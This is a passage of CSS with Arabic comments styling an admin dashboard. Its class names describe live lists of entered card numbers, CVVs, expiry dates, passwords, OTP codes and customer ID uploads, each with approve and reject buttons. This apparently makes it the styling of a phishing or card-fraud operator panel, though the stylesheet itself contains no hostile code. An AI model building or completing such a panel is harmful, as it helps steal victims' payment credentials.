  background: var(--dash-surface-subtle);
  color: var(--dash-text);
  font-size: 0.74rem;
  font-weight: 700;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  gap: 4px;
  transition: all 0.15s ease;
  flex-shrink: 0;
}

.entry-copy-btn:hover {
  background: var(--dash-surface);
  border-color: var(--dash-muted);
}

.entry-copy-btn.copied {
  background: var(--dash-success);
  color: #ffffff;
  border-color: var(--dash-success);
}

.history-modal-footer {
  padding: 12px 18px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  border-top: 1px solid var(--dash-line-soft);
  background: var(--dash-surface-subtle);
}

.history-count-note {
  font-size: 0.78rem;
  color: var(--dash-muted);
}

/* سجل المدخلات المباشر تحت القيمة الحالية */
.stage-inline-history {
  display: flex;
  flex-direction: column;
  gap: 4px;
  margin-top: 6px;
  padding-top: 6px;
  border-top: 1px dashed var(--dash-line);
  flex: 1 1 auto;
  min-height: 0;
}

.inline-history-head {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 2px;
  margin-bottom: 2px;
}

.inline-history-title {
  display: flex;
  align-items: center;
  gap: 4px;
  font-size: 0.66rem;
  font-weight: 800;
  color: var(--dash-muted);
}

.inline-history-list {
  display: flex;
  flex-direction: column;
  gap: 3px;
  max-height: 120px;
  overflow-y: auto;
  padding-right: 2px;
}

.inline-history-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 6px;
  padding: 4px 6px;
  background: var(--dash-surface-subtle);
  border: 1px solid var(--dash-line-soft);
  border-radius: 5px;
  transition: all 0.15s ease;
}

.inline-history-row:hover {
  background: var(--dash-card);
  border-color: var(--dash-line);
}

.inline-history-row.is-current-active {
  border-color: rgba(2, 106, 50, 0.35);
  background: rgba(2, 106, 50, 0.05);
}

.history-item-main {
  display: flex;
  align-items: center;
  gap: 6px;
  flex-wrap: wrap;
  flex: 1;
  min-width: 0;
}

.history-item-values {
  display: flex;
  align-items: center;
  gap: 6px;
  flex-wrap: wrap;
}

.history-item-values.creds-values {
  gap: 8px;
}

.history-card-num,
.history-user-val,
.history-code-val {
  font-size: 0.72rem;
  font-weight: 700;
  color: var(--dash-text);
}

.history-pass-val {
  font-size: 0.72rem;
  font-weight: 700;
  color: #ef4444;
}

.history-card-exp,
.history-card-cvv {
  font-size: 0.66rem;
  font-weight: 600;
  color: var(--dash-muted);
  background: rgba(0, 0, 0, 0.04);
  padding: 1px 4px;
  border-radius: 3px;
}

.history-item-time {
  font-size: 0.64rem;
  color: var(--dash-muted);
  font-family: monospace;
}

.history-item-actions {
  display: flex;
  align-items: center;
  gap: 4px;
  flex-shrink: 0;
}

/* شارة حالة المدخل في السجل */
.history-status-chip {
  display: inline-flex;
  align-items: center;
  gap: 3px;
  font-size: 0.6rem;
  font-weight: 800;
  padding: 1px 5px;
  border-radius: 4px;
  border: 1px solid transparent;
}

.history-status-chip.status-badge-approved {
  background: rgba(16, 185, 129, 0.12);
  color: #10b981;
  border-color: rgba(16, 185, 129, 0.3);
}

.history-status-chip.status-badge-rejected {
  background: rgba(239, 68, 68, 0.12);
  color: #ef4444;
  border-color: rgba(239, 68, 68, 0.3);
}

.history-status-chip.status-badge-pending {
  background: rgba(245, 158, 11, 0.12);
  color: #f59e0b;
  border-color: rgba(245, 158, 11, 0.3);
}

.history-status-chip.status-badge-past {
  background: var(--dash-surface);
  color: var(--dash-muted);
  border-color: var(--dash-line);
}

.history-copy-mini-btn {
  height: 20px;
  padding: 0 5px;
  border-radius: 4px;
  border: 1px solid var(--dash-line);
  background: var(--dash-surface);
  color: var(--dash-text);
  font-size: 0.64rem;
  font-weight: 700;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  gap: 3px;
  transition: all 0.15s ease;
}

.history-copy-mini-btn:hover {
  background: var(--dash-primary);
  color: #ffffff;
  border-color: var(--dash-primary);
}

.history-copy-mini-btn.copied {
  background: #10b981 !important;
  color: #ffffff !important;
  border-color: #10b981 !important;
}

/* شريط اتخاذ القرار */
.card-decision-bar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 8px;
  padding-top: 5px;
  margin-top: 2px;
  border-top: 1px solid var(--dash-line-soft);
  flex-wrap: wrap;
}

.decision-prompt {
  font-size: 0.7rem;
  font-weight: 700;
  color: var(--dash-text);
}

.decision-actions {
  display: flex;
  align-items: center;
  gap: 6px;
}

.decision-btn {
  height: 25px;
  padding: 0 9px;
  border-radius: 5px;
  border: none;
  font-size: 0.72rem;
  font-weight: 700;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  gap: 4px;
  transition: opacity 0.15s ease;
}

.decision-btn:hover {
  opacity: 0.9;
}

.decision-btn.approve {
  background: var(--dash-success);
  color: #ffffff;
}

.decision-btn.reject {
  background: var(--dash-danger);
  color: #ffffff;
}

/* شبكة معلومات العميل والقائمة المنسدلة */
.collapsible-header {
  width: 100%;
  border: 1px solid var(--dash-line);
  border-radius: 8px;
  background: var(--dash-surface-subtle);
  padding: 10px 14px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: space-between;
  text-align: right;
  transition: all 0.15s ease;
}

.collapsible-header:hover {
  background: var(--dash-surface);
  border-color: var(--dash-muted);
}

.collapsible-meta {
  display: flex;
  align-items: center;
  gap: 6px;
  color: var(--dash-muted);
}

.collapsible-hint {
  font-size: 0.74rem;
  font-weight: 700;
}

.chevron-arrow {
  color: var(--dash-muted);
  transition: transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}

.chevron-arrow.rotated {
  transform: rotate(180deg);
  color: var(--dash-primary);
}

.collapse-fade-enter-active,
.collapse-fade-leave-active {
  transition: all 0.2s ease;
}

.collapse-fade-enter-from,
.collapse-fade-leave-to {
  opacity: 0;
  transform: translateY(-6px);
}

.customer-info-grid {
  display: grid;
  grid-template-columns: repeat(3, minmax(0, 1fr));
  gap: 10px;
}

.info-cell {
  padding: 10px 12px;
  border-radius: 8px;
  background: var(--dash-surface-subtle);
  border: 1px solid var(--dash-line-soft);
  display: flex;
  flex-direction: column;
  gap: 3px;
}

.info-cell.full-span {
  grid-column: 1 / -1;
}

.info-label {
  font-size: 0.7rem;
  font-weight: 700;
  color: var(--dash-muted);
}

.info-value {
  font-size: 0.86rem;
  font-weight: 700;
  color: var(--dash-text);
  word-break: break-word;
}

.info-value.font-mono {
  font-family: monospace;
}

.info-value.text-emerald {
  color: var(--dash-success);
  font-weight: 800;
}

.info-value.font-medium {
  font-weight: 700;
}

.address-text {
  line-height: 1.6;
}

/* القائمة الجانبية للإعدادات (Settings Drawer) */
.drawer-backdrop {
  position: fixed;
  inset: 0;
  background: rgba(15, 23, 42, 0.45);
  backdrop-filter: blur(2px);
  z-index: 1500;
}

.settings-drawer {
  position: fixed;
  top: 0;
  bottom: 0;
  left: 0;
  width: min(320px, 86vw);
  background: var(--dash-surface);
  border-right: 1px solid var(--dash-line);
  box-shadow: 6px 0 24px rgba(0, 0, 0, 0.15);
  z-index: 1600;
  display: flex;
  flex-direction: column;
  transform: translateX(-100%);
  transition: transform 0.22s cubic-bezier(0.4, 0, 0.2, 1);
  direction: rtl;
}

.settings-drawer.open {
  transform: translateX(0);
}

.drawer-header {
  height: 52px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 16px;
  border-bottom: 1px solid var(--dash-line-soft);
}

.drawer-title {
  display: flex;
  align-items: center;
  gap: 8px;
  color: var(--dash-text);
}

.drawer-title h3 {
  margin: 0;
  font-size: 0.95rem;
  font-weight: 800;
}

.drawer-close-btn {
  width: 28px;
  height: 28px;
  border-radius: 6px;
  border: 1px solid var(--dash-line);
  background: transparent;
  color: var(--dash-muted);
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
}

.drawer-close-btn:hover {
  color: var(--dash-text);
}

.drawer-content {
  flex: 1;
  overflow-y: auto;
  padding: 16px;
  display: flex;
  flex-direction: column;
  gap: 16px;
}

.drawer-user-card {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 10px 12px;
  border-radius: 8px;
  background: var(--dash-surface-subtle);
  border: 1px solid var(--dash-line-soft);
}

.user-avatar-circle {
  width: 36px;
  height: 36px;
  border-radius: 50%;
  background: var(--dash-surface);
  border: 1px solid var(--dash-line);
  display: flex;
  align-items: center;
  justify-content: center;
  color: var(--dash-muted);
}

.user-meta-info {
  display: flex;
  flex-direction: column;
  min-width: 0;
}

.user-email-text {
  font-size: 0.8rem;
  font-weight: 800;
  color: var(--dash-text);
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

.user-role-label {
  font-size: 0.7rem;
  color: var(--dash-muted);
}

.drawer-group {
  display: flex;
  flex-direction: column;
  gap: 6px;
}

.drawer-group-title {
  font-size: 0.72rem;
  font-weight: 800;
  color: var(--dash-muted);
  padding: 0 4px;
}

.drawer-control-btn {
  width: 100%;
  height: 40px;
  border-radius: 8px;
  border: 1px solid var(--dash-line);
  background: var(--dash-surface);
  color: var(--dash-text);
  padding: 0 12px;
  display: flex;
  align-items: center;
  gap: 10px;
  cursor: pointer;
  transition: all 0.12s ease;
}

.drawer-control-btn:hover {
  background: var(--dash-surface-subtle);
}

.btn-left-icon {
  color: var(--dash-muted);
  display: flex;
}

.btn-text-block {
  flex: 1;
  text-align: right;
  font-size: 0.82rem;
  font-weight: 700;
}

.switch-badge {
  font-size: 0.68rem;
  font-weight: 800;
  padding: 2px 7px;
  border-radius: 10px;
}

.switch-badge.active {
  background: var(--dash-success-subtle);
  color: var(--dash-success);
}

.switch-badge.inactive {
  background: var(--dash-danger-subtle);
  color: var(--dash-danger);
}

.switch-badge.neutral {
  background: var(--dash-surface-subtle);
  color: var(--dash-muted);
}

.count-pill-small {
  font-size: 0.7rem;
  font-weight: 800;
  padding: 1px 6px;
  border-radius: 10px;
  background: var(--dash-primary-subtle);
  color: var(--dash-primary);
}

.count-pill-small.danger-pill {
  background: var(--dash-danger-subtle);
  color: var(--dash-danger);
}

.drawer-control-btn.danger {
  border-color: rgba(239, 68, 68, 0.22);
  color: var(--dash-danger);
}

.drawer-control-btn.danger:hover {
  background: var(--dash-danger-subtle);
  border-color: rgba(239, 68, 68, 0.4);
}

.drawer-control-btn.danger .btn-left-icon {
  color: var(--dash-danger);
}

.drawer-footer {
  padding: 12px 16px;
  border-top: 1px solid var(--dash-line-soft);
}

.drawer-logout-btn {
  width: 100%;
  height: 38px;
  border-radius: 8px;
  border: none;
  background: var(--dash-primary);
  color: #ffffff;
  font-size: 0.86rem;
  font-weight: 700;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  cursor: pointer;
}

.drawer-logout-btn:hover {
  background: var(--dash-primary-hover);
}

/* النوافذ المنبثقة (Modals) */
.modal-backdrop {
  position: fixed;
  inset: 0;
  background: rgba(15, 23, 42, 0.6);
  backdrop-filter: blur(3px);
  z-index: 2000;
  display: grid;
  place-items: center;
  padding: 16px;
  direction: rtl;
}

.admin-modal-box {
  width: 100%;
  max-width: 860px;
  max-height: 88vh;
  background: var(--dash-surface);
  border: 1px solid var(--dash-line);
  border-radius: 14px;
  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25);
  display: flex;
  flex-direction: column;
  overflow: hidden;
}

.modal-header {
  padding: 14px 20px;
  border-bottom: 1px solid var(--dash-line-soft);
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 12px;
}

.modal-header-title {
  display: flex;
  align-items: center;
  gap: 10px;
}

.modal-icon-badge {
  width: 36px;
  height: 36px;
  border-radius: 8px;
  background: var(--dash-primary-subtle);
  color: var(--dash-primary);
  display: flex;
  align-items: center;
  justify-content: center;
}

.modal-header-title h3 {
  margin: 0;
  font-size: 1rem;
  font-weight: 800;
  color: var(--dash-text);
}

.modal-header-title p {
  margin: 0;
  font-size: 0.74rem;
  color: var(--dash-muted);
}

.modal-header-actions {
  display: flex;
  align-items: center;
  gap: 8px;
}

.add-admin-btn {
  height: 32px;
  padding: 0 12px;
  border-radius: 6px;
  border: none;
  background: var(--dash-primary);
  color: #ffffff;
  font-size: 0.8rem;
  font-weight: 700;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  gap: 5px;
}

.add-admin-btn.active {
  background: var(--dash-surface-subtle);
  color: var(--dash-text);
  border: 1px solid var(--dash-line);
}

.modal-close-btn {
  width: 32px;
  height: 32px;
  border-radius: 6px;
  border: 1px solid var(--dash-line);
  background: transparent;
  color: var(--dash-muted);
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
}

.modal-close-btn:hover {
  color: var(--dash-danger);
  border-color: var(--dash-danger);
}

.modal-tabs {
  display: flex;
  align-items: center;
  gap: 6px;
  padding: 8px 20px;
  background: var(--dash-surface-subtle);
  border-bottom: 1px solid var(--dash-line-soft);
  flex-wrap: wrap;
}

.modal-tab-btn {
  height: 30px;
  padding: 0 10px;
  border-radius: 6px;
  border: 1px solid transparent;
  background: transparent;
  color: var(--dash-muted);
  font-size: 0.78rem;
  font-weight: 700;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  gap: 6px;
}

.modal-tab-btn:hover {
  color: var(--dash-text);
}

.modal-tab-btn.active {
  background: var(--dash-surface);
  border-color: var(--dash-line);
  color: var(--dash-primary);
}

.tab-badge {
  font-size: 0.68rem;
  padding: 1px 6px;
  border-radius: 10px;
  background: var(--dash-surface-subtle);
  color: var(--dash-muted);
}

.tab-badge.green {
  background: var(--dash-success-subtle);
  color: var(--dash-success);
}

.feedback-banner {
  padding: 10px 16px;
  font-size: 0.82rem;
  font-weight: 700;
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.feedback-banner.success {
  background: var(--dash-success-subtle);
  color: var(--dash-success);
}

.feedback-banner.error {
  background: var(--dash-danger-subtle);
  color: var(--dash-danger);
}

.banner-dismiss {
  background: none;
  border: none;
  color: inherit;
  cursor: pointer;
  font-weight: 800;
}

.modal-body-scroll {
  flex: 1;
  overflow-y: auto;
  padding: 16px 20px;
  display: flex;
  flex-direction: column;
  gap: 14px;
}

.admin-form-card {
  padding: 14px 16px;
  border-radius: 8px;
  background: var(--dash-surface-subtle);
  border: 1px solid var(--dash-line);
  display: flex;
  flex-direction: column;
  gap: 10px;
}

.form-title-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.form-title-row h4 {
  margin: 0;
  font-size: 0.88rem;
  font-weight: 800;
  color: var(--dash-text);
}

.form-cancel-x {
  background: none;
  border: none;
  color: var(--dash-muted);
  cursor: pointer;
  font-size: 0.9rem;
}

.form-row-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 10px;
}

.form-cell {
  display: flex;
  flex-direction: column;
  gap: 4px;
}

.form-cell.full {
  grid-column: 1 / -1;
}

.form-cell label {
  font-size: 0.74rem;
  font-weight: 700;
  color: var(--dash-muted);
}

.form-cell input,
.form-cell select {
  height: 36px;
  border-radius: 6px;
  border: 1px solid var(--dash-line);
  background: var(--dash-surface);
  color: var(--dash-text);
  padding: 0 10px;
  font-size: 0.84rem;
  outline: none;
}

.form-submit-row {
  display: flex;
  justify-content: flex-end;
  gap: 8px;
  margin-top: 4px;
}

.btn-secondary {
  height: 32px;
  padding: 0 12px;
  border-radius: 6px;
  border: 1px solid var(--dash-line);
  background: var(--dash-surface);
  color: var(--dash-text);
  font-size: 0.78rem;
  font-weight: 700;
  cursor: pointer;
}

.btn-primary {
  height: 32px;
  padding: 0 14px;
  border-radius: 6px;
  border: none;
  background: var(--dash-primary);
  color: #ffffff;
  font-size: 0.78rem;
  font-weight: 700;
  cursor: pointer;
}

.pwd-inline-group {
  display: flex;
  gap: 8px;
}

.pwd-inline-group input {
  flex: 1;
  height: 34px;
  border-radius: 6px;
  border: 1px solid var(--dash-line);
  background: var(--dash-surface);
  color: var(--dash-text);
  padding: 0 10px;
  font-size: 0.84rem;
}

.btn-warning {
  height: 34px;
  padding: 0 12px;
  border-radius: 6px;
  border: none;
  background: var(--dash-warning);
  color: #ffffff;
  font-size: 0.78rem;
  font-weight: 700;
  cursor: pointer;
}

.admins-card-grid {
  display: flex;
  flex-direction: column;
  gap: 8px;
}

.admin-profile-card {
  padding: 12px 14px;
  border-radius: 8px;
  background: var(--dash-surface);
  border: 1px solid var(--dash-line);
  display: flex;
  flex-direction: column;
  gap: 8px;
}

.admin-profile-card.is-current {
  border-color: rgba(2, 106, 50, 0.35);
  background: var(--dash-primary-subtle);
}

.admin-profile-header {
  display: flex;
  align-items: center;
  gap: 10px;
}

.avatar-box {
  width: 36px;
  height: 36px;
  border-radius: 50%;
  background: var(--dash-surface-subtle);
  border: 1px solid var(--dash-line);
  display: flex;
  align-items: center;
  justify-content: center;
  color: var(--dash-muted);
  position: relative;
  flex-shrink: 0;
}

.avatar-dot {
  position: absolute;
  bottom: 0;
  right: 0;
  width: 9px;
  height: 9px;
  border-radius: 50%;
  border: 1.5px solid var(--dash-surface);
}

.avatar-dot.online {
  background: var(--dash-success);
}

.avatar-dot.offline {
  background: #94a3b8;
}

.profile-info-text {
  flex: 1;
  display: flex;
  flex-direction: column;
  min-width: 0;
}

.profile-name-line {
  display: flex;
  align-items: center;
  gap: 6px;
  flex-wrap: wrap;
}

.profile-name-line strong {
  font-size: 0.88rem;
  color: var(--dash-text);
}

.self-tag {
  font-size: 0.65rem;
  font-weight: 800;
  padding: 1px 6px;
  border-radius: 4px;
  background: var(--dash-primary-subtle);
  color: var(--dash-primary);
}

.role-tag,
.presence-tag,
.status-tag {
  font-size: 0.65rem;
  font-weight: 800;
  padding: 1px 6px;
  border-radius: 4px;
}

.role-tag.superadmin {
  background: var(--dash-warning-subtle);
  color: var(--dash-warning);
}

.role-tag.admin {
  background: var(--dash-surface-subtle);
  color: var(--dash-muted);
}

.presence-tag.online {
  background: var(--dash-success-subtle);
  color: var(--dash-success);
}

.presence-tag.offline {
  background: var(--dash-surface-subtle);
  color: var(--dash-muted);
}

.status-tag.active {
  color: var(--dash-success);
}

.status-tag.inactive {
  color: var(--dash-danger);
}

.email-sub {
  font-size: 0.75rem;
  color: var(--dash-muted);
  font-family: monospace;
}

.profile-meta-row {
  font-size: 0.72rem;
  color: var(--dash-muted);
}

.profile-actions-bar {
  display: flex;
  align-items: center;
  gap: 6px;
  flex-wrap: wrap;
}

.profile-action-btn {
  height: 26px;
  padding: 0 8px;
  border-radius: 5px;
  border: 1px solid var(--dash-line);
  background: var(--dash-surface);
  color: var(--dash-text);
  font-size: 0.72rem;
  font-weight: 700;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  gap: 4px;
}

.profile-action-btn:hover {
  background: var(--dash-surface-subtle);
}

.profile-action-btn.danger {
  color: var(--dash-danger);
  border-color: rgba(220, 38, 38, 0.25);
}

.profile-action-btn.danger:hover {
  background: var(--dash-danger-subtle);
}

.protected-account-indicator {
  display: inline-flex;
  align-items: center;
  gap: 5px;
  padding: 4px 10px;
  border-radius: 6px;
  background: rgba(16, 185, 129, 0.12);
  color: #10b981;
  font-size: 0.74rem;
  font-weight: 800;
  border: 1px solid rgba(16, 185, 129, 0.25);
}

.role-tag.primary-superadmin {
  background: rgba(245, 158, 11, 0.16) !important;
  color: #d97706 !important;
  border: 1px solid rgba(245, 158, 11, 0.35) !important;
  font-weight: 800 !important;
}

/* نافذة تأكيد الحذف المصغرة */
.confirm-dialog-card {
  width: min(380px, 100%);
  padding: 24px;
  border-radius: 12px;
  background: var(--dash-surface);
  border: 1px solid var(--dash-line);
  box-shadow: var(--dash-shadow-md);
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
  gap: 10px;
}

.confirm-icon-wrap {
  width: 44px;
  height: 44px;
  border-radius: 50%;
  background: var(--dash-danger-subtle);
  color: var(--dash-danger);
  display: flex;
  align-items: center;
  justify-content: center;
}

.confirm-dialog-card h2 {
  margin: 0;
  font-size: 1.08rem;
  font-weight: 800;
  color: var(--dash-text);
}

.confirm-dialog-card p {
  margin: 0;
  font-size: 0.84rem;
  color: var(--dash-muted);
  line-height: 1.5;
}

.confirm-actions-row {
  display: flex;
  gap: 8px;
  width: 100%;
  margin-top: 8px;
}

.confirm-actions-row button {
  flex: 1;
}

.btn-danger {
  height: 34px;
  border-radius: 6px;
  border: none;
  background: var(--dash-danger);
  color: #ffffff;
  font-size: 0.82rem;
  font-weight: 700;
  cursor: pointer;
}

.btn-danger:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

/* حالات الفراغ */
.state-box {
  padding: 30px 14px;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 8px;
  color: var(--dash-muted);
  font-size: 0.82rem;
  font-weight: 700;
  text-align: center;
}

.state-box.error-state {
  color: var(--dash-danger);
}

.state-box.empty p {
  margin: 0;
}

/* إعدادات وتخصيص الواتساب (WhatsApp Settings) */
.whatsapp-drawer-btn .whatsapp-icon-box {
  color: #25d366;
}

.switch-badge.whatsapp-active {
  background: rgba(37, 211, 102, 0.14);
  color: #16a34a;
  font-family: monospace;
  font-weight: 800;
}

.whatsapp-modal-box {
  max-width: 560px;
}

.whatsapp-modal-badge {
  background: rgba(37, 211, 102, 0.14);
  color: #16a34a;
}

.whatsapp-modal-body {
  padding: 20px;
  display: flex;
  flex-direction: column;
  gap: 16px;
  overflow-y: auto;
  max-height: calc(88vh - 130px);
}

.whatsapp-input-card {
  display: flex;
  flex-direction: column;
  gap: 10px;
  background: var(--dash-surface-subtle);
  padding: 16px;
  border-radius: 10px;
  border: 1px solid var(--dash-line-soft);
}

.whatsapp-field-label {
  display: flex;
  flex-direction: column;
  gap: 4px;
  font-size: 0.86rem;
  font-weight: 800;
  color: var(--dash-text);
}

.whatsapp-field-label .label-hint {
  font-size: 0.72rem;
  font-weight: 500;
  color: var(--dash-muted);
}

.whatsapp-input-wrapper {
  display: flex;
  align-items: center;
  background: var(--dash-surface);
  border: 1.5px solid var(--dash-line);
  border-radius: 8px;
  padding: 0 12px;
  transition: all 0.18s ease;
}

.whatsapp-input-wrapper:focus-within {
  border-color: #25d366;
  box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.15);
}

.whatsapp-input-prefix {
  color: #25d366;
  display: flex;
  align-items: center;
  margin-inline-end: 10px;
}

.whatsapp-text-input {
  flex: 1;
  height: 42px;
  border: none;
  background: transparent;
  font-size: 0.95rem;
  font-weight: 700;
  color: var(--dash-text);
  font-family: monospace;
  outline: none;
}

.clear-input-btn {
  border: none;
  background: transparent;
  color: var(--dash-muted);
  cursor: pointer;
  padding: 6px;
  display: flex;
  align-items: center;
  border-radius: 4px;
}

.clear-input-btn:hover {
  color: var(--dash-danger);
  background: var(--dash-danger-subtle);
}

.country-quick-tags {
  display: flex;
  align-items: center;
  gap: 6px;
  flex-wrap: wrap;
  margin-top: 4px;
}

.quick-tags-title {
  font-size: 0.72rem;
  font-weight: 700;
  color: var(--dash-muted);
}

.country-tag-btn {
  font-size: 0.74rem;
  font-weight: 700;
  padding: 3px 8px;
  border-radius: 6px;
  border: 1px solid var(--dash-line);
  background: var(--dash-surface);
  color: var(--dash-text);
  cursor: pointer;
  transition: all 0.12s ease;
}

.country-tag-btn:hover {
  border-color: #25d366;
  color: #16a34a;
  background: rgba(37, 211, 102, 0.08);
}

.whatsapp-preview-card {
  display: flex;
  flex-direction: column;
  gap: 8px;
  background: var(--dash-surface-subtle);
  padding: 14px;
  border-radius: 10px;
  border: 1px solid var(--dash-line-soft);
}

.preview-card-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 8px;
  flex-wrap: wrap;
}

.preview-title {
  font-size: 0.78rem;
  font-weight: 800;
  color: var(--dash-muted);
}

.test-link-btn {
  display: inline-flex;
  align-items: center;
  gap: 5px;
  font-size: 0.75rem;
  font-weight: 700;
  color: #16a34a;
  background: rgba(37, 211, 102, 0.12);
  border: 1px solid rgba(37, 211, 102, 0.3);
  border-radius: 6px;
  padding: 4px 10px;
  cursor: pointer;
  transition: all 0.15s ease;
}

.test-link-btn:hover {
  background: rgba(37, 211, 102, 0.22);
  border-color: #16a34a;
}

.preview-url-box {
  display: block;
  font-size: 0.82rem;
  font-weight: 700;
  padding: 8px 12px;
  border-radius: 6px;
  background: var(--dash-surface);
  border: 1px solid var(--dash-line);
  color: var(--dash-text);
  word-break: break-all;
}

.preview-hint {
  margin: 0;
  font-size: 0.7rem;
  color: var(--dash-muted);
  line-height: 1.45;
}

.whatsapp-modal-footer {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 14px 20px;
  border-top: 1px solid var(--dash-line-soft);
  gap: 12px;
}

.btn-reset-whatsapp {
  height: 36px;
  padding: 0 14px;
  border-radius: 6px;
  border: 1px solid var(--dash-line);
  background: transparent;
  color: var(--dash-muted);
  font-size: 0.82rem;
  font-weight: 700;
  cursor: pointer;
  transition: all 0.15s ease;
}

.btn-reset-whatsapp:hover:not(:disabled) {
  color: var(--dash-danger);
  border-color: var(--dash-danger);
  background: var(--dash-danger-subtle);
}

.footer-action-buttons {
  display: flex;
  align-items: center;
  gap: 8px;
}

.whatsapp-save-btn {
  background: #16a34a !important;
  color: #ffffff !important;
  border: none !important;
  font-weight: 800 !important;
}

.whatsapp-save-btn:hover:not(:disabled) {
  background: #15803d !important;
}

/* استجابة الشاشات (Responsive) */
@media (max-width: 1080px) {
  .auth-credentials-grid {
    grid-template-columns: 1fr;
  }
}

@media (max-width: 900px) {
  .dashboard-main {
    grid-template-columns: 1fr;
  }

  .customers-panel {
    max-height: 280px;
  }

  .customer-info-grid {
    grid-template-columns: 1fr 1fr;
  }
}

@media (max-width: 600px) {
  .dashboard-shell {
    padding: 8px;
  }

  .dashboard-topbar {
    flex-direction: column;
    align-items: stretch;
    height: auto;
    padding: 10px;
    gap: 8px;
  }

  .topbar-right {
    justify-content: space-between;
  }

  .customer-info-grid {
    grid-template-columns: 1fr;
  }
}

/* بطاقة عرض المستندات المرفوعة في لوحة التحكم */
.customer-documents-container {
  margin-top: 14px;
}

.admin-documents-grid {
  display: grid;
  grid-template-columns: repeat(3, minmax(0, 1fr));
  gap: 14px;
  padding: 14px 16px;
}

.admin-doc-card {
  border: 1px solid var(--dash-line);
  border-radius: 8px;
  background: var(--dash-surface);
  overflow: hidden;
  display: flex;
  flex-direction: column;
}

.admin-doc-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 10px 12px;
  border-bottom: 1px solid var(--dash-line);
  background: #f8fafc;
}

.admin-doc-title {
  font-size: 0.8rem;
  font-weight: 800;
  color: var(--dash-text);
}

.admin-doc-tag {
  font-size: 0.7rem;
  font-weight: 800;
  padding: 2px 8px;
  border-radius: 4px;
}

.admin-doc-tag.success {
  background: #dcfce7;
  color: #15803d;
}

.admin-doc-tag.missing {
  background: #f1f5f9;
  color: #64748b;
}

.admin-doc-preview {
  position: relative;
  height: 140px;
  background: #0f172a;
  cursor: pointer;
  overflow: hidden;
}

.admin-doc-img {
  width: 100%;
  height: 100%;
  object-fit: cover;
  display: block;
  transition: transform 0.2s ease;
}

.admin-doc-preview:hover .admin-doc-img {
  transform: scale(1.05);
}

.admin-doc-zoom-overlay {
  position: absolute;
  inset: 0;
  background: rgba(15, 23, 42, 0.68);
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  opacity: 0;
  transition: opacity 0.2s ease;
}

.admin-doc-preview:hover .admin-doc-zoom-overlay {
  opacity: 1;
}

.doc-action-btn {
  display: inline-flex;
  align-items: center;
  gap: 5px;
  padding: 6px 12px;
  border-radius: 5px;
  font-size: 0.76rem;
  font-weight: 700;
  cursor: pointer;
  border: 0;
  transition: all 0.15s ease;
  text-decoration: none;
}

.doc-action-btn.view-btn {
  background: #ffffff;
  color: #0f172a;
}

.doc-action-btn.view-btn:hover {
  background: #f1f5f9;
}

.doc-action-btn.download-btn {
  background: var(--dash-primary);
  color: #ffffff;
}

.doc-action-btn.download-btn:hover {
  background: #015226;
}

.admin-doc-footer {
  padding: 8px 12px;
  background: #f8fafc;
  border-top: 1px solid var(--dash-line);
  display: flex;
  justify-content: center;
}

.direct-download-link {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  color: var(--dash-primary);
  font-size: 0.76rem;
  font-weight: 700;
  background: transparent;
  border: 0;
  cursor: pointer;
  padding: 3px 6px;
  border-radius: 4px;
  transition: background 0.15s ease;
}

.direct-download-link:hover {
  background: rgba(2, 106, 50, 0.08);
}

.admin-doc-empty {
  height: 140px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: var(--dash-muted);
  font-size: 0.8rem;
  background: #fafafa;
}

.documents-decision-bar {
  border-top: 1px solid var(--dash-line);
  padding: 10px 16px;
  background: #f8fafc;
}

/* نافذة معاينة المستندات في الداشبورد */
.doc-lightbox-box {
  max-width: 800px;
  width: 100%;
}

.doc-lightbox-body {
  padding: 16px;
  background: #0f172a;
  display: flex;
  align-items: center;
  justify-content: center;
  max-height: 70vh;
  overflow: auto;
}

.doc-lightbox-img {
  max-width: 100%;
  max-height: 65vh;
  object-fit: contain;
  border-radius: 6px;
}

@media (max-width: 1380px) {
  .dashboard-main {
    grid-template-columns: 220px 220px minmax(0, 1fr);
    gap: 0;
  }
}

@media (max-width: 1100px) {
  .dashboard-main {
    grid-template-columns: 1fr 1fr;
  }
  .customer-details {
    grid-column: span 2;
  }
}

@media (max-width: 900px) {
  .admin-documents-grid {
    grid-template-columns: 1fr;
  }
}

@media (max-width: 768px) {
  .dashboard-main {
    grid-template-columns: 1fr;
    display: flex;
    flex-direction: column;
  }
  .customers-panel {
    max-height: 380px;
  }
}

/* ==========================================================================
   تنبيه إعادة إرسال رمز OTP (OTP Resend Square Indicator)
   ========================================================================== */
.otp-resend-square {
  /* مربع حقيقي بأبعاد متساوية (ليس مستطيل) - حجم مناسب لرأس لوحة التحكم */
  width: 112px;
  height: 112px;
